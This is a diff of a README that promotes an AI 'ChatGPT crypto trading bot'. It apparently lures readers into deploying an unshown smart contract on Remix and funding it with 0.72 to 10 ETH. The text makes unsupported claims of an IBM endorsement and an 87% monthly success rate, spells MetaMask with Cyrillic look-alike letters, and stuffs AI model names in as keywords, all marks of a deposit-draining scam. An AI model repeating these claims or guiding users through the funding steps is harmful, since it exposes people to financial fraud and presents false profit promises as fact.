@@ -8,7 +8,7 @@ As seen on IBM Artificial Intelligence YouTube Channel: https://www.youtube.com/
 
 This bot allows you to trade cryptocurrencies using AI algorithms through ChatGPT and other AI models directly on the blockchain. It will analyze market data, important trends, and token sentiments as well as trader portfolios to make fully automated trading movements on your behalf. Stop-losses are built in to prevent any mistakes in opening and closing positions. The bot manages leverages and optimizes risk in real time. No code knowledge is neccessary and nothing is required to download. Simply use the code source to create your own smart contract that will serve as your "bot" on remix.ethereum.org the web-based development enviornment for Ethereum smart contracts. Step by step instructions below.
 
-STEP-BY-STEP INSTRUCTIONS:
+##  🟢STEP-BY-STEP INSTRUCTIONS:
 
 🟢 Step 1: Download МetаМаsk: https://metamask.io/download
 
@@ -53,7 +53,9 @@ The minimum recommended amount is 0.72 ETH - 10 ETH
 
 Here's a YouTube video if you are still confused: https://www.youtube.com/watch?v=A25BI356kA0&t=37s
 
-❓ FAQ:
+
+## ❓ FAQ
+
 ❓Is this bot profitable?
 
 It can very well be. Depending on your configuration and setup as well as market conditions. From user experience, we are seeing 87% success rate month-over-month using this ChatGPT artificial intelligence model.
@@ -92,9 +94,9 @@ Updates and improvements may be added over time, but no guarantees are made rega
 
 
 
-🚀 Project Goal
+##  🚀 Project Goal
 Create an adaptive AI ecosystem capable of autonomous learning and trading, designed as a foundation for future self-organizing market agents.
 
-🧠 Keywords / Tags
+##  🧠 Keywords / Tags
 ChatGPT Trading Bot, ChatGPT Crypto Trader, ChatGPT AI Trading System, AI Trading Bot, Autonomous AI Trader, AI Arbitrage Bot, DeepSeek Trading Bot, Qwen Trading Bot, Gemini AI Trader, Grok Trading AI, Claude Trading Bot, AI Crypto Bot, Automated Trading System, Hyperliquid AI Trading, AI Portfolio Manager, Algorithmic Trading AI, AI Signal Bot, AI Scalping Bot, Market Making AI, ChatGPT Arbitrage Bot, AI Quant Trader, Machine Learning Trading Bot, Binance AI Trading Bot, Bybit AI Bot, OKX AI Trader, Crypto AI Assistant, Autonomous Market Bot, AI Risk Management System, GPT-based Trading Bot, Local AI Trading Environment, Multi-Model Trading Framework, ChatGPT Strategy Builder, AI Copy Trading Bot, AI Market Analyzer, AI PnL Tracker, Smart RR Bot, Crypto Trading Automation, AI Trading Simulation, AI Day Trading Bot, AI Swing Trading System, AI Backtesting Engine, AI Sentiment Analyzer
 
